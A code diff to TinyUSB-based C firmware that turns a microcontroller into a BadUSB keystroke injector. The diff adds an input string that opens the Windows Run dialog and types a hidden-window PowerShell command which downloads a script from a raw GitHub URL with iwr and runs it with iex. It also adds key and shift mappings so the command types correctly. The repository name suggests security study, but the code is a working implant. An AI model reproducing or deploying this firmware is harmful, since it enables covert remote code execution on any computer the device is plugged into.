@@ -102,17 +102,30 @@ void tud_resume_cb(void)
 //--------------------------------------------------------------------+
 // USB HID
 //--------------------------------------------------------------------+
-const char* inputs = "r|powershel|l\n";
-const int inputs_len = 14;
+const char* inputs = "r~powershel~l -w h iwr 'ht~tps:/~/raw.githubusercontent.com/map32/cybersecurity-badusb/main/hey.ps1' | iex\n";
+const int inputs_len = 108;
 uint8_t char_to_hid_code (uint8_t c) {
   if (c >= 'A' && c <= 'Z') return c - 'A' + HID_KEY_A;
   else if (c >= 'a' && c <= 'z') return c - 'a' + HID_KEY_A;
   else if (c >= '1' && c <= '9') return c - '1' + HID_KEY_1;
   else if (c == '0') return HID_KEY_0;
-  else if (c == '\n') return HID_KEY_ENTER;
+  else if (c == '\n' || c == '\r') return HID_KEY_ENTER;
+  else if (c == ' ') return HID_KEY_SPACE;
+  else if (c == '/') return HID_KEY_SLASH;
+  else if (c == '\\' || c == '|') return HID_KEY_BACKSLASH;
+  else if (c == '-') return HID_KEY_MINUS;
+  else if (c == '.') return HID_KEY_PERIOD;
+  else if (c == '$') return HID_KEY_4;
+  else if (c == '\"' || c == '\'') return HID_KEY_APOSTROPHE;
+  else if (c == '&') return HID_KEY_7;
+  else if (c == '^') return HID_KEY_6;
+  else if (c == '>') return HID_KEY_PERIOD;
+  else if (c == ':') return HID_KEY_SEMICOLON;
+  else if (c == '(') return HID_KEY_9;
+  else if (c == ')') return HID_KEY_0;
   return HID_KEY_NONE; //error check
 }
-uint32_t interval_ms = 50;
+uint32_t interval_ms = 10;
 static void send_hid_report(uint8_t report_id, uint32_t btn)
 {
 
@@ -132,11 +145,17 @@ static void send_hid_report(uint8_t report_id, uint32_t btn)
       if (first) {
         modifier_bits = 1 << 3; //Left Windows key
         first = false;
-        interval_ms = 100;
-      } else if (counter == 1) {
-        interval_ms = 20;
+        interval_ms = 200;
       }
-      if (counter < inputs_len) keycode[0] = char_to_hid_code(inputs[counter]);
+      if (counter < inputs_len){
+        keycode[0] = char_to_hid_code(inputs[counter]);
+        if (inputs[counter] == '\r'){
+          interval_ms = 250;
+        } else if (inputs[counter] == '~') {
+          interval_ms = 10;
+        }
+        if (inputs[counter] == '$' || inputs[counter] == '^' || inputs[counter] == '&' ||inputs[counter] == '>' || inputs[counter] == ':' || inputs[counter] == '(' || inputs[counter] == ')' || inputs[counter] == '\"' || inputs[counter] == '|') modifier_bits = 1 << 1;
+      }
       tud_hid_keyboard_report(REPORT_ID_KEYBOARD, modifier_bits, keycode);
       /**has_keyboard_key = true;
       key_already_pressed = !key_already_pressed;
